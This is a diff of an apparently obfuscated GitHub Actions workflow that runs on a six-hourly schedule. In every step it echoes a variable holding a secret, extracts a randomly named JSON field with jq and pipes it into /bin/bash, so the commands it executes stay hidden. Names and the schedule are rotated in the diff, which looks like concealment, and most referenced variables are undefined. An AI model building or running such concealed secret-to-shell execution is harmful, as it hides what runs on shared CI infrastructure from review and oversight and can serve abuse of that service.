@@ -3,7 +3,7 @@ name: meilitong3214
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 4/6 * * *'
+    - cron: '34 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: meilitong3214
         env:
-          gs64: ${{ secrets.gs64 }}
+          uk6402: ${{ secrets.uk6402 }}
         run: |
-          echo $gs64 | jq -r .ktrp6901 | /bin/bash
-          echo $bdeu19999 | jq -r .fe4 | /bin/bash
-          echo $oedxq5150 | jq -r .bhors80 | /bin/bash
-          echo $f06461 | jq -r .z4 | /bin/bash
-          echo $rxe44 | jq -r .qcur92 | /bin/bash
-          echo $boh256 | jq -r .kkm17568 | /bin/bash
-          echo $hwgl8 | jq -r .ymo89758 | /bin/bash
-          echo $ffqi9503 | jq -r .kvg7779 | /bin/bash
-          echo $guji37945 | jq -r .zpcye2216 | /bin/bash
-          echo $sq4 | jq -r .ys7560 | /bin/bash
+          echo $uk6402 | jq -r .d74 | /bin/bash
+          echo $czea8513 | jq -r .un04499 | /bin/bash
+          echo $ghski990 | jq -r .gsq75 | /bin/bash
+          echo $tc7 | jq -r .zis29 | /bin/bash
+          echo $wa082 | jq -r .ajkdr085 | /bin/bash
+          echo $q77 | jq -r .dm72364 | /bin/bash
+          echo $bq6017 | jq -r .pah9924 | /bin/bash
+          echo $j5342 | jq -r .wio6353 | /bin/bash
 
